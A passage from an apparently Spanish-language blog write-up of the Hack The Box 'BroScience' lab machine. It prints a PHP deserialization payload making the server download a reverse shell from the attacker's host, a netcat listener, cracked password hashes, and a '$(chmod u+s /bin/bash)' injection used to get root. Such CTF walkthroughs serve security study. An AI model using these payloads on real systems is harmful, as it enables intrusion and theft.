+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>❯ wfuzz --hh=1256 -c -z file,codigos.php 'https://broscience.htb/activate.php?code=FUZZ'
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                      
+=====================================================================
+
+000000501:   200        27 L     65 W       1251 Ch     "9RLps9HakHqodR6BQGz3HcHux72To6ei"
+</pre></table></code></div></div><p>Y listo, ya puedes iniciar sesión en la web. Ahora vemos la cookie “user-prefs” que vemos que está en base64, si lo decodificamos vemos lo siguiente</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ echo "Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=" | base64 -d
+O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
+</pre></table></code></div></div><p>Si vemos en el script de “utils.php” vemos que las cookies son serializadas y el servidor la deserializa para interpretarla. Con esto ya sabemos que podemos efectuar un “deserialization Attack”</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>function get_theme() {
+    if (isset($_SESSION['id'])) {
+        if (!isset($_COOKIE['user-prefs'])) {
+            $up_cookie = base64_encode(serialize(new UserPrefs()));
+            setcookie('user-prefs', $up_cookie);
+        } else {
+            $up_cookie = $_COOKIE['user-prefs'];
+        }
+        $up = unserialize(base64_decode($up_cookie));
+        return $up-&gt;theme;
+    } else {
+        return "light";
+    }
+}
+</pre></table></code></div></div><p>Nos copiamos un script de <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php</a> de monkey pentester</p><p>Ahora modificamos el “utils.php” al final del script para cargar un recurso de nuestra máquina al servidor</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">"http://10.10.16.68/shell.php"</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$imgPath</span> <span class="o">=</span> <span class="s2">"./shell.php"</span><span class="p">;</span> 
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
+        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">AvatarInterface</span><span class="p">));</span>
+
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Le damos permisos de ejecución y lo ejecutamos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ php utils.php
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE2LjY4L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==
+</pre></table></code></div></div><p>Ahora cargamos ese base64 a las cookies, y recargamos la página</p><p><code class="language-plaintext highlighter-rouge">Nota:</code> Ponemos los dos “==” url encodeados cuando los pongamos en la página antes de recargar</p><p><img data-src="/assets/img/commons/Broscience/cookie.png" alt="Cookies" class="center-image" data-proofer-ignore> <em>Cambiando Cookies</em></p><p>Luego nos vamos a “https://broscience.htb/shell.php” para que se ejecute el scrip. Pero nos ponemos en escucha por el puerto 80 con python y en escucha con netcat por el puerto 443</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.95.77 - - [09/Jan/2023 19:06:14] "GET /shell.php HTTP/1.0" 200 -
+10.129.95.77 - - [09/Jan/2023 19:06:14] "GET /shell.php HTTP/1.0" 200 -
+10.129.95.77 - - [09/Jan/2023 19:06:15] "GET /shell.php HTTP/1.0" 200 -
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.68] from (UNKNOWN) [10.129.95.77] 37776
+Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
+ 19:06:17 up 19:34,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname -I
+10.129.95.77 dead:beef::250:56ff:feb9:c1d3
+</pre></table></code></div></div><p>Una vez hemos obtenido acceso, hay que cambiar de usuario. Para ello nos conectamos a la base de datos que se emplea. Si hacemos un “ps -faux” para ver las tareas que se están ejecutando, vemos un “postgress” ya con esto sabes que se emplea Postgress SQL</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>www-data@broscience:/$ psql -U dbuser -h localhost -W -d broscience 
+Password: RangeOfMotion%777
+</pre></table></code></div></div><p>Enumeramos las tablas que hay</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>broscience=&gt; \dt;
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+--------+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | users     | table | postgres
+(3 rows)
+
+broscience=&gt; 
+</pre></table></code></div></div><p>Ahora vemos el contenido de la tabla users</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>broscience=&gt; select * from users;
+  
+1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf |   
+2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 |   
+3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 |   
+4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 |   
+5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm |
+
+</pre></table></code></div></div><p>Vemos los hashes, los copiamos y los rompemos con hashcat. Una cosa a tener en cuenta es que estos hashes necesitan del “salt” que esto es para que sea más complicado a un atacante romper los hashes, pero nosotros ya lo tenemos que lo encontramos en el archivo de “db_connect.php”</p><p>Ahora así nos quedan los hashes</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>❯ cat hashes
+
+15657792073e8a843d4f91fc403454e1:NaCl
+13edad4932da9dbb57d9cd15b66ed104:NaCl
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
+a7eed23a7be6fe0d765197b1027453fe:NaCl
+5d15340bded5b9395d5d14b9c21bc82b:NaCl
+</pre></table></code></div></div><p>Ahora los rompemos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt
+
+  13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+  bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
+  5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
+</pre></table></code></div></div><p>Y nos conectamos por ssh</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ ssh bill@broscience.htb
+bill@broscience.htb's password: 
+bill@broscience:~$ hostname -I
+10.129.95.77 dead:beef::250:56ff:feb9:c1d3 
+bill@broscience:~$ 
+</pre></table></code></div></div><p>Nos pasamos pspy a la máquina victima y vemos que se está ejecutando un script de bash “/opt/renew_cert.sh”. Si le echamos un vistazo vemos que ejecuta el siguiente comando</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;"$country
+</pre></table></code></div></div><p>También lo ejecutamos pero le modificamos algunas cosas. Y luego le inyectamos nuestro código cuando nos pregunte por el “CommonName”</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout test.key -out test.crt -days 1
+
+Generating a RSA private key
+.......................................++++
+...................................................++++
+writing new private key to 'test.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
+Email Address []:
+</pre></table></code></div></div><p>Esperamos un poco a que root ejecute el script y listo, podemos hacer “bash -p”</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>bill@broscience:~/Certs$ bash -p 
+bash-5.1# whoami
+root
+bash-5.1#
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/waf-bypass/" class="post-tag no-text-decoration" >Waf bypass</a> <a href="/tags/deserialization-attack/" class="post-tag no-text-decoration" >Deserialization Attack</a> <a href="/tags/cron-job/" class="post-tag no-text-decoration" >Cron Job</a> <a href="/tags/cracking-passwords/" class="post-tag no-text-decoration" >Cracking Passwords</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BroScience+Writeup+-+Miguel3023&url=%2Fposts%2Fwriteup-broscience%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BroScience+Writeup+-+Miguel3023&u=%2Fposts%2Fwriteup-broscience%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fwriteup-broscience%2F&text=BroScience+Writeup+-+Miguel3023" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Writeup-Surveillance/">Surveillance Writeup</a><li><a href="/posts/writeup-broscience/">BroScience Writeup</a><li><a href="/posts/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a><li><a href="/posts/rbcd-attack/">Resource-Based Constrained Delegation Attack</a><li><a href="/posts/NoSQLI/">NoSQLI</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-forgot/"><div class="card-body"> <em class="small" data-ts="1668834000" data-df="DD/MM/YYYY" > 19/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forgot Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del priv...</p></div></div></a></div><div class="card"> <a href="/posts/Writeup-Surveillance/"><div class="card-body"> <em class="small" data-ts="1702702800" data-df="DD/MM/YYYY" > 16/12/2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Surveillance Writeup</h3><div class="text-muted small"><p> Reconocimiento Inicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados. 1 2 3 4 5 6 7 8 9 10 11...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-Soccer/"><div class="card-body"> <em class="small" data-ts="1671426000" data-df="DD/MM/YYYY" > 19/12/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Soccer Writeup</h3><div class="text-muted small"><p> En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/rbcd-attack/" class="btn btn-outline-primary" prompt="Anterior"><p>Resource-Based Constrained Delegation Attack</p></a> <a href="/posts/Writeup-Surveillance/" class="btn btn-outline-primary" prompt="Nuevo"><p>Surveillance Writeup</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/AngelMiguel3023">miguel3023</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
